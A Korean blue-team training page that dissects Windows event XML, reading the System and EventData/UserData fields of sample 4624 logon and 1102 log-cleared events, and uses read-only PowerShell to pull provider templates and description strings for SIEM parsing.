---
title: "Windows 이벤트 속 들여다보기 — System과 EventData, 템플릿과 설명 문구, 꼭 모아야 할 채널"
tags:
  - training
  - blue-team
  - windows
  - logging
  - event-logs
---

# Windows 이벤트 속 들여다보기 — System과 EventData, 템플릿과 설명 문구, 꼭 모아야 할 채널 { #event-structure-channels }

!!! abstract "이 페이지에서 다루는 것"
    앞 페이지에서는 이벤트가 그걸 쓴 프로그램에서 `.evtx` 파일까지 가는 길을 따라갔습니다. 이번에는 이벤트 하나를 열어서 분해합니다. Windows 이벤트는 모두 두 부분으로 되어 있습니다. 어느 PC의 어느 이벤트든 칸이 똑같은 <strong>System</strong> 부분, 그리고 이벤트를 쓴 프로그램이 칸을 정해서 이벤트 ID마다 내용이 달라지는 <strong>EventData</strong>(또는 <strong>UserData</strong>) 부분입니다. 4624 하나를 두 부분 모두 칸별로 읽고, 1102 "로그 지움" 이벤트에서 UserData 모양을 본 다음, PowerShell로 공급자의 <strong>템플릿(Template)</strong>(이벤트가 가질 칸 목록)과 <strong>설명 문구(Description)</strong>(`%1`, `%2` … 빈칸이 있는 문장)를 꺼내서, 둘이 합쳐져 이벤트 뷰어의 메시지가 되는 과정을 직접 봅니다. 그리고 SIEM이 그 메시지를 정규식으로 파싱하면 안 되는 이유를 정확히 짚습니다. 뒷부분은 <strong>어떤 채널을 모아야 하는가</strong>입니다. Security, System, Application 말고도 PowerShell, Security-Mitigations, Code Integrity, AppLocker, Defender, 방화벽, Sysmon 채널, 그리고 실제 침해에서 중요한 몇 개를 더해, 핵심 이벤트 ID, 공격자의 어떤 행동이 거기 남는지, 시끄러운 채널을 어떻게 거르는지 다룹니다. 마지막으로 우리 Windows 로그 수집에 대해 답할 수 있어야 하는 네 가지 질문과 확인 문제가 있습니다.

!!! note "표기"
    **[보충]** = 꼭 알아야 할 실무 보충, **[정정]** = 흔히 잘못 알려진 내용 정정, **[변경됨]**/**[주의]** = 최근 바뀐 점과 옛 방식대로 하면 위험한 점. 호스트 이름, 도메인, 계정, IP, 파일 이름, 해시는 모두 설명용 가상 값(`.example`, 문서용·사설 IP)입니다.

## 한눈에 보는 핵심 8가지 { #key-points }

1. Windows 이벤트는 모두 <strong>두 부분</strong>으로 된 XML이다. <strong>System</strong>에는 모든 이벤트에 똑같은 칸들이 있다(공급자, 이벤트 ID, 버전, 수준, 작업, 키워드, 시간, 레코드 ID, 프로세스/스레드, 채널, 컴퓨터). <strong>EventData</strong> — 일부 이벤트는 <strong>UserData</strong> — 에는 이벤트를 만든 쪽이 정한 칸들이 있어서, 이벤트 ID와 공급자마다 다르다.
2. System은 "<strong>어떤 종류의 이벤트를, 누가, 언제, 어디서</strong>"에 답한다. EventData는 "<strong>정확히 무슨 일이 있었나</strong>"(누가 로그온했나, 어느 IP에서, 어떤 프로세스가 어떤 명령줄로 시작됐나)에 답한다. 탐지에는 거의 항상 둘 다 필요하다.
3. System의 `Execution ProcessID`는 이벤트를 <strong>쓴</strong> 프로세스다(Security라면 LSASS). 이벤트가 *말하는* 프로세스가 아니다. 이벤트가 말하는 프로세스는 EventData(`ProcessName`, `NewProcessName` …)에 있다.
4. 공급자는 이벤트 ID와 <strong>버전</strong>마다 <strong>템플릿</strong>을 갖고 있다. 칸 이름과 형식을 순서대로 적은 목록이다. `Get-WinEvent -ListProvider`로 꺼내 볼 수 있다. 한 이벤트 ID에 칸이 서로 다른 버전이 여러 개 있을 수 있으니, 파서는 어떤 칸이 늘 있다고 가정하면 안 된다.
5. 공급자는 <strong>설명 문구</strong>도 갖고 있다. 번호 붙은 빈칸이 있는 읽기 좋은 문장이다. `%1`은 템플릿의 첫 번째 칸, `%2`는 두 번째 칸이다. `%%1833` 같은 값은 메시지 표에서 찾아 바꾼다.
6. <strong>메시지 = 설명 문구 + EventData 값(+ System 메타데이터).</strong> 메시지는 누군가 이벤트를 볼 때마다 새로 만들어지고, 언어마다 바뀔 수 있고, 칸을 숨길 수도 있고, 탭과 대시와 있다 없다 하는 줄이 섞여 있다. XML 칸(또는 그걸 믿을 만하게 바꾼 JSON)을 모으고, 메시지는 사람을 위한 편의로만 여긴다.
7. Security, System, Application은 누구나 아는 채널이지만, 요즘 공격 상당수는 다른 채널에만 남는다. <strong>PowerShell/Operational</strong>(스크립트 블록), <strong>Sysmon/Operational</strong>, <strong>Defender/Operational</strong>, <strong>Security-Mitigations</strong>, <strong>CodeIntegrity/Operational</strong>, <strong>AppLocker</strong>, <strong>Windows 방화벽</strong>, 그리고 실무에서는 <strong>TaskScheduler</strong>, <strong>TerminalServices</strong>, <strong>WMI-Activity</strong>, <strong>Bits-Client</strong>도. 무언가를 막은 방어 기능은 SOC에 *알려 주기도* 해야 한다.
8. 우리 환경을 알아야 한다. 감사 정책과 추가 도구, 이벤트 시스템 밖에 로그를 쓰는 프로그램, 어떤 채널을 모으는지, SIEM에서 XML 칸이 보이는지 메시지가 보이는지 둘 다인지, 그리고 제대로 파싱되는지. 여기에 답하지 못하면, 놓치는 줄도 모르고 놓친다.

## 모든 이벤트의 두 부분 { #two-sections }

### 봉투와 편지 { #analogy }

Windows 이벤트를 봉투에 든 편지라고 생각해 보세요. <strong>봉투</strong>는 정해진 모양입니다. 전국 어느 봉투든 칸이 같습니다 — 보내는 사람, 받는 사람, 소인 날짜, 등기 번호. 우편 분류기는 안에 든 편지를 몰라도 어떤 봉투든 분류할 수 있습니다. <strong>편지</strong>는 자유 형식입니다. 은행 명세서, 생일 카드, 세금 고지서는 생김새가 완전히 다르고, 어떤 종류의 편지인지 아는 사람만 제대로 읽을 수 있습니다.

Windows에서 봉투는 <strong>System</strong> 부분이고, 편지는 <strong>EventData</strong> 부분입니다. SIEM은 System만으로도 모든 이벤트를 분류하고, 거르고, 시간순으로 놓을 수 있습니다. 무슨 일이 있었는지 알려면 EventData가 필요하고, 지금 들고 있는 게 "어떤 종류의 편지"(공급자 + 이벤트 ID + 버전)인지도 알아야 합니다.

### 실제로 저장된 모습 그대로의 이벤트 하나 { #full-xml }

서버 `APP-03`에 원격 데스크톱 로그온이 성공한 기록을 이벤트 뷰어의 <strong>자세히 → XML 보기</strong>로 연 모습입니다.

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
    <EventID>4624</EventID>
    <Version>2</Version>
    <Level>0</Level>
    <Task>12544</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8020000000000000</Keywords>
    <TimeCreated SystemTime="2026-11-19T22:41:07.5312406Z" />
    <EventRecordID>883104</EventRecordID>
    <Correlation ActivityID="{6c1e0f52-93a8-4b2e-9d1a-2f7b81c4e0aa}" />
    <Execution ProcessID="788" ThreadID="5120" />
    <Channel>Security</Channel>
    <Computer>APP-03.corp.example</Computer>
    <Security />
  </System>
  <EventData>
    <Data Name="SubjectUserSid">S-1-5-18</Data>
    <Data Name="SubjectUserName">APP-03$</Data>
    <Data Name="SubjectDomainName">CORP</Data>
    <Data Name="SubjectLogonId">0x3e7</Data>
    <Data Name="TargetUserSid">S-1-5-21-1004336348-1177238915-682003330-2417</Data>
    <Data Name="TargetUserName">a.kim</Data>
    <Data Name="TargetDomainName">CORP</Data>
    <Data Name="TargetLogonId">0x1d4f2a8</Data>
    <Data Name="LogonType">10</Data>
    <Data Name="LogonProcessName">User32 </Data>
    <Data Name="AuthenticationPackageName">Negotiate</Data>
    <Data Name="WorkstationName">APP-03</Data>
    <Data Name="LogonGuid">{b9a4c0de-1f22-7a3e-5d10-6e8f2c9a4b71}</Data>
    <Data Name="TransmittedServices">-</Data>
    <Data Name="LmPackageName">-</Data>
    <Data Name="KeyLength">0</Data>
    <Data Name="ProcessId">0x1a8c</Data>
    <Data Name="ProcessName">C:\Windows\System32\svchost.exe</Data>
    <Data Name="IpAddress">10.20.7.54</Data>
    <Data Name="IpPort">0</Data>
    <Data Name="ImpersonationLevel">%%1833</Data>
    <Data Name="RestrictedAdminMode">%%1843</Data>
    <Data Name="TargetOutboundUserName">-</Data>
    <Data Name="TargetOutboundDomainName">-</Data>
    <Data Name="VirtualAccount">%%1843</Data>
    <Data Name="TargetLinkedLogonId">0x0</Data>
    <Data Name="ElevatedToken">%%1843</Data>
  </EventData>
</Event>
```

첫 줄 `<Event xmlns="…">`는 "이건 Microsoft 이벤트 형식(스키마)을 따르는 Windows 이벤트입니다"라는 뜻일 뿐입니다. 그 아래에 두 부분이 나옵니다.

### System 부분, 칸별로 읽기 { #system-fields }

이 칸들은 모든 공급자의 모든 이벤트에, 모든 Windows PC에 있습니다. 그래서 쓸모가 큽니다. SIEM이 언제나 믿고 쓸 수 있으니까요.

- `<Provider Name="Microsoft-Windows-Security-Auditing" Guid="{…}" />` — <strong>이벤트를 쓴 쪽</strong>. 이름은 이벤트 뷰어에 "원본"으로 나오는 값이고, GUID는 공급자의 고정된 신분 번호입니다. 앞 페이지에서 봤듯, 이벤트 ID는 이 칸과 함께여야 의미가 있습니다.
- `<EventID>4624</EventID>` — <strong>어떤 종류의 이벤트인가</strong>. 4624 = "계정이 성공적으로 로그온했습니다". 로그온 세션이 만들어질 때마다, 로그온을 *당한* PC에 남습니다 — 콘솔, 네트워크, 서비스, RDP, 잠금 해제 등 모두. 공격자에게 중요한 이유는, 훔친 자격 증명을 쓸 때마다(pass-the-hash, 훔친 비밀번호로 RDP, SMB로 옆 PC 이동) 하나씩 남기 때문입니다. 그래서 4624는 자격 증명 오용 탐지의 뼈대입니다(MITRE ATT&CK <strong>T1078</strong> 유효한 계정, <strong>T1021</strong> 원격 서비스). 로그온 유형은 "꼭 알아야 할 이벤트" 섹션에서 자세히 다룹니다.
- `<Version>2</Version>` — 이 이벤트 템플릿의 <strong>몇 번째 버전</strong>을 썼는가. Microsoft는 4624에 칸을 조금씩 더해 왔습니다(옛 시스템은 버전 0, 버전 1과 2에서 칸이 늘어남). 어떤 칸이 있는지가 버전에 따라 달라지므로 파서는 버전을 읽어야 합니다.
- `<Level>0</Level>` — 심각도. Security 감사 이벤트는 성공이든 실패든 늘 0("LogAlways")입니다.
- `<Task>12544</Task>` — 작업 범주 번호. 12544는 <strong>Logon</strong>입니다.
- `<Opcode>0</Opcode>` — 작업 안에서의 동작 코드(시작, 중지, 정보 …). Security 이벤트에서는 거의 늘 0("Info")입니다. 시작/중지 쌍을 기록하는 다른 공급자들에게서는 의미가 있습니다.
- `<Keywords>0x8020000000000000</Keywords>` — 꼬리표 비트마스크. `0x8020…` = <strong>감사 성공(Audit Success)</strong>, `0x8010…` = <strong>감사 실패(Audit Failure)</strong>. Security에서 성공과 실패를 가르는 건 Level이 아니라 이 칸입니다.
- `<TimeCreated SystemTime="2026-11-19T22:41:07.5312406Z" />` — 이벤트가 쓰인 시각. <strong>UTC</strong>(`Z`)이고, 100나노초 단위까지 있습니다. 이벤트 뷰어 일반 탭은 현지 시간으로 바꿔 보여 주기 때문에, 둘을 섞으면 타임라인이 틀어지는 고전적인 실수가 생깁니다. (11월 19일 22:41 UTC는 캔버라 시간으로 11월 20일 09:41입니다.)
- `<EventRecordID>883104</EventRecordID>` — 이 PC, 이 채널 안의 일련번호. 늘 커지기만 해서, 내보낸 로그에서 번호가 건너뛰면 레코드가 지워졌다는 단서가 될 수 있습니다. PC끼리는 겹칠 수 있으니, SIEM에서 고유한 열쇠는 대략 *컴퓨터 + 채널 + 레코드 ID*입니다.
- `<Correlation ActivityID="{…}" />` — 한 작업에서 나온 이벤트들을 묶는 선택적 ID. Security 이벤트는 대부분 비워 둡니다(`<Correlation />`). Windows Update나 네트워크 쪽 일부 공급자는 이걸 써서 관련 이벤트를 묶을 수 있게 합니다.
- `<Execution ProcessID="788" ThreadID="5120" />` — 이벤트를 <strong>쓴</strong> 프로세스와 스레드. Security라면 늘 <strong>LSASS</strong>(여기서는 PID 788)입니다. Security에는 보안 하위 시스템만 쓸 수 있으니까요. <strong>[정정]</strong> 이걸 "로그온한 프로세스"나 "실행된 프로세스"로 읽는 실수가 흔합니다. 아닙니다. 활동과 관련된 프로세스는 EventData에 있습니다(여기서는 `ProcessName`, 4688에서는 `NewProcessName`).
- `<Channel>Security</Channel>` — 이벤트가 들어간 채널(곧 어느 `.evtx` 파일인지).
- `<Computer>APP-03.corp.example</Computer>` — 이벤트를 <strong>기록한</strong> PC. 로그온이라면 로그온을 *받은* PC이지, 사용자가 앉아 있던 PC가 아닙니다. 여기서는 FQDN(전체 이름)인데, 짧은 이름을 쓰는 소스나 에이전트도 있어서 호스트로 검색할 때 중요합니다.
- `<Security />` — 공급자가 기록해 둘 때, 이벤트를 일으킨 사용자 맥락. Security 이벤트는 대부분 비어 있고, 다른 이벤트는 `<Security UserID="S-1-5-21-…" />`처럼 채워서 어느 계정이 이 일을 일으켰는지 알려 줍니다(서비스 설치 같은 System·Application 채널 이벤트에서 흔합니다).

### EventData 부분, 칸별로 읽기 { #eventdata-fields }

이 칸들은 이벤트 4624 버전 2를 만든 쪽이 정했습니다. 다른 이벤트 ID는 칸이 완전히 다릅니다.

- `SubjectUserSid S-1-5-18`, `SubjectUserName APP-03$`, `SubjectDomainName CORP`, `SubjectLogonId 0x3e7` — <strong>주체(Subject)</strong>: 사용자를 대신해 로그온을 *요청한* 계정. `S-1-5-18`은 <strong>SYSTEM</strong>의 잘 알려진 SID이고, 컴퓨터 계정 `APP-03$`가 SYSTEM으로 동작하며, 로그온 ID `0x3e7`은 늘 SYSTEM 세션입니다. 그 PC가 직접 처리한 로그온이면 정상적인 모습입니다.
- `TargetUserSid …-2417`, `TargetUserName a.kim`, `TargetDomainName CORP` — <strong>대상(Target)</strong>: 실제로 로그온된 계정. "이 사용자가 어디에 로그온했지?"를 찾을 때 검색하는 칸입니다.
- `TargetLogonId 0x1d4f2a8` — 이 로그온으로 만들어진 <strong>로그온 세션 ID</strong>. Windows 로그에서 가장 중요한 연결 고리(pivot) 칸입니다. 이 세션에서 나오는 이후 이벤트는 모두 같은 값을 갖습니다 — 4688 프로세스 생성의 `SubjectLogonId`, 4672 특수 권한 이벤트, 4634/4647 로그오프. `0x1d4f2a8`로 검색하면 이 RDP 세션이 끝날 때까지 한 일이 다 나옵니다.
- `LogonType 10` — <strong>RemoteInteractive</strong> = 원격 데스크톱. (2 = 자판 앞 대화형, 3 = 네트워크(예: SMB), 5 = 서비스, 7 = 잠금 해제 … 나중에 자세히.)
- `LogonProcessName "User32 "` — 로그온을 처리한 로그온 프로세스. <strong>끝에 공백</strong>이 있는 게 보이나요? 이 칸은 경우에 따라 고정 길이라서, 다른 로그온에서는 `Negotiat`처럼 여덟 글자로 잘린 값도 봅니다. <strong>[주의]</strong> `LogonProcessName = "User32"`처럼 정확히 일치를 거는 규칙은 `"User32 "`를 놓칩니다. 공백을 잘라 내거나 "~로 시작"으로 거세요.
- `AuthenticationPackageName Negotiate` — Negotiate가 Kerberos나 NTLM 중 하나를 골랐다는 뜻. 네트워크 로그온에서는 `Kerberos`나 `NTLM`이 바로 보이는 경우가 많습니다. Kerberos여야 할 곳에 NTLM이 보이면 옆 PC 이동이나 릴레이를 의심할 단서입니다.
- `WorkstationName APP-03` — 클라이언트가 *주장하는* PC 이름. RDP에서는 서버 자기 이름인 경우가 많으니, 출발지로 믿으면 안 됩니다.
- `LogonGuid {…}` — 이 로그온을 도메인 컨트롤러의 Kerberos 티켓 이벤트(4769)와 이어 줍니다. 모두 0인 GUID는 대개 Kerberos를 쓰지 않은 로그온이라는 뜻입니다.
- `TransmittedServices -`, `LmPackageName -`, `KeyLength 0` — Kerberos 위임 정보, 그리고 NTLM 버전과 키 길이(여기에 `NTLM V1`이 보이면 약한 프로토콜을 쓴다는 발견 사항). 대시는 "해당 없음"입니다.
- `ProcessId 0x1a8c`, `ProcessName C:\Windows\System32\svchost.exe` — 로그온을 <strong>요청한</strong> 프로세스(여기서는 `svchost.exe` 안의 원격 데스크톱 서비스). 콘솔 로그온이면 `winlogon.exe`, 네트워크 로그온이면 `-`인 경우가 많습니다. 여기에 엉뚱한 프로세스(예: 사용자가 쓸 수 있는 경로)가 보이면 살펴볼 가치가 있습니다.
- `IpAddress 10.20.7.54`, `IpPort 0` — <strong>로그온이 어디서 왔나</strong>. RDP와 네트워크 로그온에서 찾는 출발지가 이 칸입니다. `-`나 `::1`/`127.0.0.1`이면 로컬입니다.
- `ImpersonationLevel %%1833` — 글자가 아니라 <strong>메시지 표 참조</strong>입니다. `%%1833`은 "가장(Impersonation)"으로 바뀌어 보입니다. 뜻은 만들어진 메시지에서만(또는 코드를 찾아봐야) 보입니다.
- `RestrictedAdminMode %%1843` — RDP 제한된 관리자 모드를 썼는지(`%%1843`은 "아니요"). RDP가 아닌 로그온이면 `-`입니다.
- `TargetOutboundUserName -`, `TargetOutboundDomainName -` — `runas /netonly` 같은 "새 자격 증명" 로그온(유형 9)에서 채워집니다. 로컬 세션과 다른 자격 증명으로 네트워크에 접근하는 방식이라, 눈여겨볼 만한 기법입니다.
- `VirtualAccount %%1843` — "아니요": 가상 서비스 계정이 아님.
- `TargetLinkedLogonId 0x0`과 `ElevatedToken %%1843` — 사용자 계정 컨트롤(UAC)이 켜져 있으면 관리자는 서로 연결된 세션 <strong>두 개</strong>를 받습니다. 권한을 걸러 낸 세션과 높인 세션. 연결 ID는 짝이 되는 세션을 가리키고, `ElevatedToken`은 이 세션이 관리자 토큰을 온전히 가졌는지 알려 줍니다("예"는 `%%1842`). 여기처럼 일반 사용자의 RDP 로그온은 짝도 없고 권한 상승도 없습니다.

<strong>[보충]</strong> 이렇게 읽어 보면 SIEM에 중요한 사실 두 가지가 보입니다. 첫째, 여러 칸에 <strong>코드</strong>(`%%1833`, `0x3e7`, SID)가 들어 있고, 메시지로 만들어져야 말이 됩니다. 둘째, <strong>같은 이름이 이벤트마다 다른 뜻</strong>입니다. `SubjectUserName`은 4624에서는 요청한 쪽이지만 4688에서는 프로세스를 시작한 사용자입니다. 칸은 늘 그 칸이 속한 이벤트의 맥락에서 읽으세요.

### UserData 모양 { #userdata }

`<Data Name="…">`가 들어 있는 `<EventData>`를 쓰지 않는 이벤트도 있습니다. 대신 자기만의 XML 구조로 된 <strong>UserData</strong> 부분을 씁니다. 잘 알려진 예가 Security <strong>1102</strong>, "감사 로그를 지웠습니다"입니다.

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Eventlog" Guid="{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}" />
    <EventID>1102</EventID>
    <Version>0</Version>
    <Level>4</Level>
    <Task>104</Task>
    <Opcode>0</Opcode>
    <Keywords>0x4020000000000000</Keywords>
    <TimeCreated SystemTime="2026-11-19T23:02:51.0081127Z" />
    <EventRecordID>883391</EventRecordID>
    <Correlation />
    <Execution ProcessID="1372" ThreadID="6404" />
    <Channel>Security</Channel>
    <Computer>APP-03.corp.example</Computer>
    <Security />
  </System>
  <UserData>
    <LogFileCleared xmlns="http://manifests.microsoft.com/win/2004/08/windows/eventlog">
      <SubjectUserSid>S-1-5-21-1004336348-1177238915-682003330-2417</SubjectUserSid>
      <SubjectUserName>a.kim</SubjectUserName>
      <SubjectDomainName>CORP</SubjectDomainName>
      <SubjectLogonId>0x1d4f2a8</SubjectLogonId>
    </LogFileCleared>
  </UserData>
</Event>
```

- System 부분은 앞과 똑같아 보이지만, `Provider Name="Microsoft-Windows-Eventlog"`를 보세요. 로그 지움 이벤트는 Security 채널에 들어 있어도 감사 공급자가 아니라 <strong>Event Log 서비스 자신</strong>이 씁니다. (수준이 4인 것도 그래서입니다. 공급자가 다르면 관례도 다릅니다.) "채널 하나, 공급자 여럿"의 실제 예입니다.
- `Execution ProcessID="1372"`는 LSASS가 아니라 Event Log 서비스의 `svchost.exe`입니다.
- `<UserData><LogFileCleared xmlns="…">` — `<Data Name=…>` 항목이 나란히 있는 대신, 공급자 고유 요소 아래에 칸들이 자식 요소로 들어 있습니다. `EventData/Data[@Name]`만 아는 파서는 이 이벤트에서 <strong>칸을 하나도</strong> 못 봅니다. 에이전트와 SIEM이 UserData를 처리하는지 꼭 확인하세요.
- `SubjectLogonId 0x1d4f2a8` — 위 RDP 로그온과 같은 세션 ID입니다. 이걸로 이어 보면 이야기가 나옵니다. `a.kim`이 22:41 UTC에 10.20.7.54에서 RDP로 로그온했고, 20분 뒤 같은 세션이 Security 로그를 지웠습니다. MITRE ATT&CK <strong>T1070.001</strong>(Windows 이벤트 로그 지우기)이고, 바로 사람에게 가야 할 경보입니다. 공격자는 그 전에 한 일을 숨기려고 로그를 지웁니다.

<strong>[보충]</strong> 오래된 "클래식" 이벤트에는 세 번째 모양도 있습니다. `<EventData>` 안의 `<Data>`에 <strong>이름이 없고</strong> 값만 순서대로 있는 경우입니다. `Write-EventLog`(앞 페이지)로 쓴 이벤트나, 서드파티 Application 이벤트 상당수가 이렇습니다. 이때 SIEM에는 `param1`, `param2` 같은 칸만 보이고, 메시지 문장이 가장 쓸모 있는 정보일 수도 있습니다.

## 템플릿: 이벤트가 담을 칸 목록 { #templates }

### 템플릿을 왜 봐야 하나? { #why-templates }

탐지 규칙이나 파서를 만들 때는, 내가 본 샘플에 우연히 있던 칸이 아니라 그 이벤트가 *가질 수 있는* 칸을 알아야 합니다. 공급자의 <strong>템플릿</strong>이 공식 답입니다. 팀에서 아무도 써 본 적 없는 채널의 낯선 이벤트를 조사할 때도 이걸 봅니다.

### PowerShell로 템플릿 꺼내기, 한 줄씩 { #template-commands }

```
PS C:\> Get-WinEvent -ListProvider * -ErrorAction SilentlyContinue | Select-Object Name | Measure-Object

Count    : 1187

PS C:\> Get-WinEvent -ListProvider *PowerShell* | Select-Object Name

Name
----
Microsoft-Windows-PowerShell
Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager
PowerShell
PowerShellCore
```

- `Get-WinEvent -ListProvider *` — 이 PC에 등록된 공급자를 모두 나열합니다(여기서는 1,187개). `-ErrorAction SilentlyContinue`는 메타데이터를 열 수 없는 몇몇 공급자의 오류를 감춥니다.
- `Select-Object Name | Measure-Object` — 이름만 남기고 개수를 셉니다.
- `-ListProvider *PowerShell*` — 와일드카드가 되니, 제품의 정확한 공급자 이름을 찾는 빠른 방법입니다. 결과: 요즘 Windows PowerShell 공급자, DSC 하위 공급자, 옛 "Windows PowerShell" 채널에 쓰는 클래식 `PowerShell` 원본, 그리고 `PowerShellCore`(PowerShell 7).

이제 공급자 하나, 이벤트 하나를 고릅니다.

```
PS C:\> $provider = Get-WinEvent -ListProvider Microsoft-Windows-Security-Auditing
PS C:\> $provider.Events | Where-Object { $_.Id -eq 4624 } | Select-Object Id, Version | Format-Table

  Id Version
  -- -------
4624       0
4624       1
4624       2
```

- `$provider = Get-WinEvent -ListProvider Microsoft-Windows-Security-Auditing` — 공급자의 메타데이터(매니페스트)를 변수에 담습니다. 로그에서 읽는 게 아니라, 이벤트의 *정의*를 읽는 겁니다.
- `$provider.Events` — 이 공급자가 쓸 수 있는 모든 이벤트. 각각 `Id`, `Version`, `Template`, `Description`, `Level`, `Task` 등을 갖습니다.
- `Where-Object { $_.Id -eq 4624 }` — 4624만 남깁니다. `$_`는 "지금 보고 있는 항목"이라는 뜻입니다.
- 결과: 4624에 <strong>버전이 셋</strong> 있습니다. 버전마다 템플릿과 설명 문구가 따로 있습니다. Windows 7 시절 호스트는 버전 0을, 요즘 시스템은 버전 2를 씁니다. 메시지 문장을 파싱하기 어려운 이유가 하나 더 생겼습니다. 어떤 줄이 들어 있는지가 버전에 따라 다르니까요.

원하는 버전의 템플릿을 봅니다.

```
PS C:\> ($provider.Events | Where-Object { $_.Id -eq 4624 -and $_.Version -eq 2 }).Template

<template xmlns="http://schemas.microsoft.com/win/2004/08/events">
  <data name="SubjectUserSid" inType="win:SID" outType="xs:string"/>
  <data name="SubjectUserName" inType="win:UnicodeString" outType="xs:string"/>
  <data name="SubjectDomainName" inType="win:UnicodeString" outType="xs:string"/>
  <data name="SubjectLogonId" inType="win:HexInt64" outType="win:HexInt64"/>
  <data name="TargetUserSid" inType="win:SID" outType="xs:string"/>
  <data name="TargetUserName" inType="win:UnicodeString" outType="xs:string"/>
  <data name="TargetDomainName" inType="win:UnicodeString" outType="xs:string"/>
  <data name="TargetLogonId" inType="win:HexInt64" outType="win:HexInt64"/>
  <data name="LogonType" inType="win:UInt32" outType="xs:unsignedInt"/>
  <data name="LogonProcessName" inType="win:UnicodeString" outType="xs:string"/>
  <data name="AuthenticationPackageName" inType="win:UnicodeString" outType="xs:string"/>
  <data name="WorkstationName" inType="win:UnicodeString" outType="xs:string"/>
  <data name="LogonGuid" inType="win:GUID" outType="xs:GUID"/>
  <data name="TransmittedServices" inType="win:UnicodeString" outType="xs:string"/>
  <data name="LmPackageName" inType="win:UnicodeString" outType="xs:string"/>
  <data name="KeyLength" inType="win:UInt32" outType="xs:unsignedInt"/>
  <data name="ProcessId" inType="win:Pointer" outType="win:HexInt64"/>
  <data name="ProcessName" inType="win:UnicodeString" outType="xs:string"/>
  <data name="IpAddress" inType="win:UnicodeString" outType="xs:string"/>
  <data name="IpPort" inType="win:UnicodeString" outType="xs:string"/>
  <data name="ImpersonationLevel" inType="win:UnicodeString" outType="xs:string"/>
  <data name="RestrictedAdminMode" inType="win:UnicodeString" outType="xs:string"/>
  <data name="TargetOutboundUserName" inType="win:UnicodeString" outType="xs:string"/>
  <data name="TargetOutboundDomainName" inType="win:UnicodeString" outType="xs:string"/>
  <data name="VirtualAccount" inType="win:UnicodeString" outType="xs:string"/>
  <data name="TargetLinkedLogonId" inType="win:HexInt64" outType="win:HexInt64"/>
  <data name="ElevatedToken" inType="win:UnicodeString" outType="xs:string"/>
</template>
```

- `-and $_.Version -eq 2` — 버전을 하나로 딱 골라서 템플릿을 셋이 아니라 하나만 받습니다.
- `.Template` — 템플릿 자체도 XML입니다. 칸 하나에 `<data>` 한 줄씩, <strong>순서대로</strong>. 이 순서가 다음 단계의 열쇠입니다. 첫 줄이 1번 칸, 둘째 줄이 2번 칸, … 마지막 줄(`ElevatedToken`)이 27번 칸입니다.
- `name="…"` — 저장된 이벤트에 `<Data Name="…">`으로 나오고, SIEM에서 칸 이름이 되는 값입니다.
- `inType="win:SID"`, `win:UnicodeString`, `win:HexInt64`, `win:UInt32`, `win:GUID`, `win:Pointer` — 값이 이진으로 어떻게 저장되는지. 이미 본 것들이 이걸로 설명됩니다. SID는 이진으로 저장되고 `S-1-5-…`로 *보여지며*, `HexInt64` 값은 `0x3e7`처럼 나오고, `ProcessId`는 포인터 크기 숫자라서 작업 관리자처럼 10진수가 아니라 16진수(`0x1a8c`)로 나옵니다.
- `outType="…"` — 값을 글자로 보여 줄 때의 형식.

<strong>[보충]</strong> 같은 메타데이터를 보는 다른 방법이 두 가지 있습니다. `cmd.exe`에서 `wevtutil gp Microsoft-Windows-Security-Auditing /ge:true /gm:true`(공급자 정보를 이벤트와 메시지까지 포함해 가져오기), 그리고 보안 이벤트마다 있는 Microsoft 문서 페이지(같은 칸 목록에 설명이 붙어 있음). 문서와 템플릿이 다르면, 지금 다루는 PC의 템플릿을 믿으세요.

### 실전 활용: EventData를 깔끔한 칸으로 바꾸기 { #parse-eventdata }

템플릿이 모든 값에 이름을 붙여 주니까, 메시지를 건드리지 않고도 어떤 이벤트든 깔끔한 객체로 바꿀 수 있습니다.

```
PS C:\> $e = Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} -MaxEvents 1
PS C:\> $x = [xml]$e.ToXml()
PS C:\> $x.Event.EventData.Data | Where-Object Name -in 'TargetUserName','LogonType','IpAddress','TargetLogonId' |
>>   Format-Table Name, '#text'

Name           #text
----           -----
TargetUserName a.kim
TargetLogonId  0x1d4f2a8
LogonType      10
IpAddress      10.20.7.54
```

- `Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} -MaxEvents 1` — 가장 최근 4624 하나.
- `$e.ToXml()` — 저장된 이벤트 XML을 문자열로 돌려줍니다. `[xml]`이 그걸 따라 들어갈 수 있는 객체로 바꿉니다.
- `$x.Event.EventData.Data` — 모든 `<Data>` 요소. 각각 `Name` 속성이 있고 값은 `#text`에 있습니다.
- `Where-Object Name -in …` — 원하는 칸 네 개만 남깁니다. 정규식도 없고, 언어나 버전에 기대지도 않습니다. 칸이 있으면 이름으로 가져옵니다. 좋은 로그 에이전트가 이벤트를 보내기 전에 하는 일이 정확히 이것입니다.

## 설명 문구: 읽기 좋은 메시지는 어디서 오나 { #descriptions }

같은 공급자 객체에 <strong>설명 문구</strong>도 들어 있습니다. 일반 탭에 보이는 글입니다. 4624 버전 2 설명 문구의 앞부분과 중요한 줄들입니다.

```
PS C:\> ($provider.Events | Where-Object { $_.Id -eq 4624 -and $_.Version -eq 2 }).Description

An account was successfully logged on.

Subject:
	Security ID:		%1
	Account Name:		%2
	Account Domain:		%3
	Logon ID:		%4

Logon Information:
	Logon Type:		%9
	Restricted Admin Mode:	%22
	Virtual Account:		%25
	Elevated Token:		%27

Impersonation Level:		%21

New Logon:
	Security ID:		%5
	Account Name:		%6
	Account Domain:		%7
	Logon ID:		%8
	Linked Logon ID:		%26
	Network Account Name:	%23
	Network Account Domain:	%24
	Logon GUID:		%13

Process Information:
	Process ID:		%17
	Process Name:		%18

Network Information:
	Workstation Name:	%12
	Source Network Address:	%19
	Source Port:		%20

Detailed Authentication Information:
	Logon Process:		%10
	Authentication Package:	%11
	Transited Services:	%14
	Package Name (NTLM only):	%15
	Key Length:		%16

This event is generated when a logon session is created. …
```

템플릿과 같이 놓고 읽어 보세요.

